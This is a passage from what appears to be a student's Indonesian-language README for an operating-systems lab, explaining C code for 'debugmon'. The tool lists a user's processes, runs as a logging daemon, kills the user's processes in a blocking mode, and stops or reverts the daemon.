    - Setiap proses dijalankan menggunakan fork.
    - Nama proses diatur menggunakan prctl.

 
### Soal 4**
a. ./debugmon list <user> akan menampilkan daftar semua proses yang sedang berjalan pada user tersebut  beserta PID, command, CPU usage, dan memory usage.
```
else if (argc == 3 && strcmp(argv[1], "list") == 0) {
    ...
    printf("PID: %d CMD: %s MEM: %.2f KB CPU: %.2f%%\n", pid, nama, mem, cpu);
}

```
![Screenshot 2025-04-17 121819](https://github.com/user-attachments/assets/88dc79e5-9eee-4769-bdc1-99c0d791b937)

b. menjalankan command ./debugmon daemon <user> maka debugmon akan jalan secara daemon dan isi dari file log bertambah dalam rentang waktu tertentu.
```
void pantau(const char *user, int mode) {
    uid_t uid = cari_uid(user);

    while (1) {
        DIR *d = opendir(PROC);
        if (!d) {
            sleep(5);
            continue;
        }

        struct dirent *e;
        while ((e = readdir(d))) {
            if (!angka_doang(e->d_name)) continue;

            int pid = atoi(e->d_name);
            char path[256], line[256], nama[256] = "-";
            FILE *f;
            uid_t uidp;

            snprintf(path, sizeof(path), PROC"/%d/status", pid);
            f = fopen(path, "r");
            if (!f) continue;

            while (fgets(line, sizeof(line), f)) {
                if (sscanf(line, "Uid: %d", &uidp) == 1) break;
            }
            fclose(f);

            if (uidp != uid) continue;

            snprintf(path, sizeof(path), PROC"/%d/comm", pid);
            f = fopen(path, "r");
            if (f) {
                fgets(nama, sizeof(nama), f);
                nama[strcspn(nama, "\n")] = 0;
                fclose(f);
            }

            if (strcmp(nama, "debugmon") == 0) {
                tulis_log_ok(nama);
            } else if (mode) {
                if (kill(pid, SIGKILL) == 0) {
                    tulis_log_fail(nama);
                }
            }
        }

        closedir(d);
        sleep(5);
    }
}


```
![Screenshot 2025-04-17 134334](https://github.com/user-attachments/assets/65006d84-5b8e-4b65-a6cf-49be34af06ff)
![Screenshot 2025-04-17 134635](https://github.com/user-attachments/assets/3805743f-f9be-4319-8b2b-b45f6c98d583)


c. debugmon stop seharusnya dia akan menghetikan si daemon dan jika sudah di hentikan tidak bakal muncul.
```
void stop_mon(const char *user) {
    DIR *d = opendir(PROC);
    if (!d) return;

    struct dirent *e;
    uid_t uid = cari_uid(user);

    while ((e = readdir(d))) {
        if (!angka_doang(e->d_name)) continue;

        int pid = atoi(e->d_name);
        char path[256], line[1024], exepath[256], real[256];
        uid_t uidp;

        snprintf(path, sizeof(path), PROC"/%d/status", pid);
        FILE *f = fopen(path, "r");
        if (!f) continue;

        while (fgets(line, sizeof(line), f)) {
            if (sscanf(line, "Uid: %d", &uidp) == 1) break;
        }
        fclose(f);
        if (uidp != uid) continue;

        snprintf(exepath, sizeof(exepath), PROC"/%d/exe", pid);
        ssize_t len = readlink(exepath, real, sizeof(real) - 1);
        if (len == -1) continue;
        real[len] = '\0';

        if (!strstr(real, "debugmon")) continue;

        if (kill(pid, SIGTERM) == 0) {
            printf("Stop debugmon (PID %d) user %s\n", pid, user);
        } else {
            perror("gagal stop");
        }
    }

```
![Screenshot 2025-04-17 135012](https://github.com/user-attachments/assets/9f6059db-f334-4909-8971-1a349258816a)

d. jika command fail di jalankan, maka user tersebut akan terblock dan tidak bisa melakukan apa-apa, dan pada log juga akan mencatat dengan setatus FAILED.
```
void tulis_log_fail(const char *nama) {
    FILE *f = fopen(LOGF, "a");
    if (!f) return;
    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    char waktu[64];
    strftime(waktu, sizeof(waktu), "[%d:%m:%Y]-[%H:%M:%S]", tm);
    fprintf(f, "%s_%s_FAILED\n", waktu, nama);
    fclose(f);
}

void tulis_log_ok(const char *nama) {
    FILE *f = fopen(LOGF, "a");
    if (!f) return;
    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    char waktu[64];
    strftime(waktu, sizeof(waktu), "[%d:%m:%Y]-[%H:%M:%S]", tm);
    fprintf(f, "%s_%s_RUNNING\n", waktu, nama);
    fclose(f);
}

void jd_daemon() {
    pid_t p = fork();
    if (p < 0) exit(1);
    if (p > 0) exit(0);
    setsid();
    umask(0);
    chdir("/home/ywwzz/Sisop-2-2025-IT36/soal_4");

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_RDWR);
}

```

e. ./debugmon revert untuk mnegembalikan user agar tidak terblock dan bisa menggunakan terminal kembali.
```
else if (argc == 3 && strcmp(argv[1], "stop") == 0 || strcmp(argv[1], "revert") == 0) {
    stop_mon(argv[2]);
}

```
